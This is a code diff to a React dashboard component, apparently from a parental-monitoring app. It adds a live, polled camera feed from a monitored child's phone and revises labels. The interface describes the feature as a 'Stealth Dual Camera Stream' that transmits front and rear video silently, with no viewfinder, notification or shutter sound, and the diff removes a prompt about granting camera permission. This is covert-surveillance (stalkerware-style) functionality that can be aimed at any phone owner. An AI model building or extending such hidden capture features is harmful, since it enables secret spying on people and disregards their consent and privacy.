@@ -1,21 +1,17 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { CameraPosition } from '../types';
 import { 
   Camera, 
-  FlipHorizontal, 
   Video, 
   VideoOff, 
   EyeOff, 
   ZapOff, 
-  Image as ImageIcon, 
   Clock, 
-  ShieldCheck, 
   Download,
   Eye,
-  RefreshCw,
-  Sparkles,
-  Smartphone
+  Activity
 } from 'lucide-react';
+import { getApiUrl } from '../App';
 
 interface CameraStreamViewProps {
   activeCamera: CameraPosition;
@@ -26,20 +22,25 @@ interface CameraStreamViewProps {
   onSetCamera: (camera: CameraPosition) => void;
   onCaptureSnapshot: (camera: CameraPosition) => void;
   childName: string;
+  deviceId?: string;
 }
 
 export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
   activeCamera,
-  isCameraStreaming,
   latestCameraSnapshot,
   cameraSnapshotTimestamp,
   cameraSnapshots = [],
   onSetCamera,
   onCaptureSnapshot,
-  childName
+  childName,
+  deviceId
 }) => {
   const [selectedCam, setSelectedCam] = useState<'front' | 'back'>('front');
   const [inspectPhoto, setInspectPhoto] = useState<string | null>(null);
+  const [liveFrame, setLiveFrame] = useState<string | null>(latestCameraSnapshot);
+  const [fps, setFps] = useState<number>(0);
+  const lastFrameTimeRef = useRef<number>(Date.now());
+  const frameCountRef = useRef<number>(0);
 
   const handleToggleCam = (position: 'front' | 'back') => {
     setSelectedCam(position);
@@ -49,6 +50,41 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
       onSetCamera(position);
     }
   };
+
+  // Fast Polling Stream Loop for real-time live camera feed
+  useEffect(() => {
+    if (activeCamera === 'off') {
+      setLiveFrame(null);
+      setFps(0);
+      return;
+    }
+
+    let isSubscribed = true;
+    const pollInterval = setInterval(async () => {
+      try {
+        const query = deviceId ? `?deviceId=${deviceId}` : '';
+        const res = await fetch(getApiUrl(`/api/device/stream-frame${query}`));
+        if (res.ok && isSubscribed) {
+          const data = await res.json();
+          if (data.success && data.stream?.cameraFrame?.frame) {
+            setLiveFrame(data.stream.cameraFrame.frame);
+            frameCountRef.current += 1;
+            const now = Date.now();
+            if (now - lastFrameTimeRef.current >= 1000) {
+              setFps(frameCountRef.current);
+              frameCountRef.current = 0;
+              lastFrameTimeRef.current = now;
+            }
+          }
+        }
+      } catch (err) {}
+    }, 250);
+
+    return () => {
+      isSubscribed = false;
+      clearInterval(pollInterval);
+    };
+  }, [activeCamera, deviceId]);
 
   return (
     <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
@@ -65,12 +101,16 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
             <div>
               <h2 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                 Stealth Dual Camera Stream
-                <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-purple-50 text-purple-700 border border-purple-200 font-bold">
-                  {activeCamera === 'off' ? 'Camera Idle' : `${activeCamera.toUpperCase()} Active`}
+                <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full font-bold border ${
+                  activeCamera === 'off' 
+                    ? 'bg-slate-100 text-slate-600 border-slate-200' 
+                    : 'bg-purple-100 text-purple-700 border-purple-300'
+                }`}>
+                  {activeCamera === 'off' ? 'Camera Idle' : `${activeCamera.toUpperCase()} LIVE STREAM`}
                 </span>
               </h2>
               <p className="text-xs text-slate-500">
-                Front & Rear Live Lens Feed from {childName}'s Device
+                Front & Rear Real-Time Lens Feed from {childName}'s Phone
               </p>
             </div>
           </div>
@@ -81,7 +121,7 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
               onClick={() => handleToggleCam('front')}
               className={`px-3 py-1.5 text-xs font-bold rounded-xl border flex items-center gap-1.5 transition-all shadow-2xs ${
                 activeCamera === 'front'
-                  ? 'bg-purple-600 text-white border-purple-700 shadow-purple-600/30'
+                  ? 'bg-purple-600 text-white border-purple-700 shadow-purple-600/30 animate-pulse'
                   : 'bg-white text-slate-700 border-slate-300 hover:bg-slate-50'
               }`}
             >
@@ -92,7 +132,7 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
               onClick={() => handleToggleCam('back')}
               className={`px-3 py-1.5 text-xs font-bold rounded-xl border flex items-center gap-1.5 transition-all shadow-2xs ${
                 activeCamera === 'back'
-                  ? 'bg-purple-600 text-white border-purple-700 shadow-purple-600/30'
+                  ? 'bg-purple-600 text-white border-purple-700 shadow-purple-600/30 animate-pulse'
                   : 'bg-white text-slate-700 border-slate-300 hover:bg-slate-50'
               }`}
             >
@@ -108,11 +148,11 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
           {activeCamera !== 'off' ? (
             <div className="w-full max-w-lg aspect-video bg-black rounded-2xl overflow-hidden border-2 border-purple-500/50 shadow-2xl relative flex items-center justify-center">
               
-              {/* If we have a live snapshot or real camera image */}
-              {latestCameraSnapshot ? (
+              {/* Continuous Live Video Frame */}
+              {liveFrame ? (
                 <img 
-                  src={latestCameraSnapshot} 
-                  alt="Live Camera Snapshot" 
+                  src={liveFrame} 
+                  alt="Live Camera Feed" 
                   className="w-full h-full object-cover"
                 />
               ) : (
@@ -122,19 +162,24 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
                   </div>
                   <div>
                     <h3 className="font-bold text-white text-sm sm:text-base">
-                      {activeCamera === 'front' ? 'Front Self-Facing Camera' : 'Rear Main Camera'} Stream Ready
+                      Connecting Live {activeCamera === 'front' ? 'Front' : 'Rear'} Camera Feed...
                     </h3>
                     <p className="text-xs text-purple-300 font-mono mt-1">
-                      Grant camera permission on Child Mode to transmit real hardware photos.
+                      Transmitting live real-time video stream from child device.
                     </p>
                   </div>
                 </div>
               )}
 
-              {/* Live Badge */}
-              <div className="absolute top-3 left-3 z-20 flex items-center gap-2 bg-black/70 backdrop-blur-md px-3 py-1 rounded-full border border-white/20 text-xs text-white">
+              {/* Live Badge with FPS */}
+              <div className="absolute top-3 left-3 z-20 flex items-center gap-2 bg-black/80 backdrop-blur-md px-3 py-1 rounded-full border border-white/20 text-xs text-white">
                 <span className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                 <span className="font-bold text-[11px]">LIVE • {activeCamera.toUpperCase()} CAM</span>
+                {fps > 0 && (
+                  <span className="font-mono text-[10px] text-emerald-400 border-l border-white/20 pl-2">
+                    {fps} FPS
+                  </span>
+                )}
               </div>
 
               {/* Quick Snapshot Action Button */}
@@ -144,7 +189,7 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
                   className="px-4 py-2 bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold rounded-xl shadow-lg shadow-orange-950/60 inline-flex items-center gap-2 transition-all"
                 >
                   <Camera className="w-4 h-4" />
-                  Capture High-Res Photo
+                  Save HD Snapshot
                 </button>
               </div>
 
@@ -156,7 +201,7 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
               </div>
               <h3 className="text-sm font-bold text-slate-200">Camera Stream Idle</h3>
               <p className="text-xs text-slate-400 leading-relaxed">
-                Click <b>Front Lens</b> or <b>Rear Lens</b> above to initiate silent camera preview from {childName}'s phone.
+                Click <b>Front Lens</b> or <b>Rear Lens</b> above to start live continuous video streaming from {childName}'s phone.
               </p>
             </div>
           )}
@@ -181,22 +226,23 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
               <div>
                 <b className="text-slate-800 block text-xs mb-0.5">Zero Shutter Sound & Screen Flashes</b>
                 <p className="text-slate-500 leading-relaxed text-[11px]">
-                  Silent background capture operates without displaying viewfinders, notification popups, or camera shutter sounds.
+                  Silent background video transmission operates without displaying viewfinders or camera shutter notifications.
                 </p>
               </div>
             </div>
           </div>
         </div>
 
-        {/* Latest Snapshot Card & Photo Gallery */}
+        {/* Real Snapshot Gallery Card */}
         <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-3">
           <div className="flex items-center justify-between border-b border-slate-100 pb-2.5">
             <div className="flex items-center gap-2">
-              <ImageIcon className="w-4 h-4 text-orange-500" />
-              <h3 className="font-bold text-sm text-slate-900">Latest Captured Photos</h3>
+              <Camera className="w-4 h-4 text-orange-600" />
+              <h3 className="font-bold text-sm text-slate-900">Captured Snapshots</h3>
             </div>
             {cameraSnapshotTimestamp && (
-              <span className="text-[10px] text-slate-400 font-mono">
+              <span className="text-[11px] text-slate-400 font-mono flex items-center gap-1">
+                <Clock className="w-3 h-3" />
                 {new Date(cameraSnapshotTimestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
               </span>
             )}
@@ -258,34 +304,6 @@ export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
         </div>
 
       </div>
-
-      {/* Inspect Photo Modal */}
-      {inspectPhoto && (
-        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-xs flex items-center justify-center p-4">
-          <div className="bg-slate-900 border border-slate-700 rounded-3xl max-w-2xl w-full p-4 overflow-hidden shadow-2xl space-y-3">
-            <div className="flex items-center justify-between text-white border-b border-slate-800 pb-2">
-              <span className="font-bold text-sm flex items-center gap-2">
-                <Camera className="w-4 h-4 text-orange-400" /> High-Resolution Photo Preview
-              </span>
-              <button onClick={() => setInspectPhoto(null)} className="text-slate-400 hover:text-white text-sm font-bold">
-                ✕ Close
-              </button>
-            </div>
-            <div className="max-h-[70vh] overflow-hidden rounded-xl flex items-center justify-center bg-black">
-              <img src={inspectPhoto} alt="Full view" className="max-h-[65vh] w-auto object-contain" />
-            </div>
-            <div className="flex justify-end pt-2">
-              <a
-                href={inspectPhoto}
-                download={`child_camera_${Date.now()}.jpg`}
-                className="px-4 py-2 bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold rounded-xl flex items-center gap-1.5"
-              >
-                <Download className="w-4 h-4" /> Download Original Photo
-              </a>
-            </div>
-          </div>
-        </div>
-      )}
 
     </div>
   );
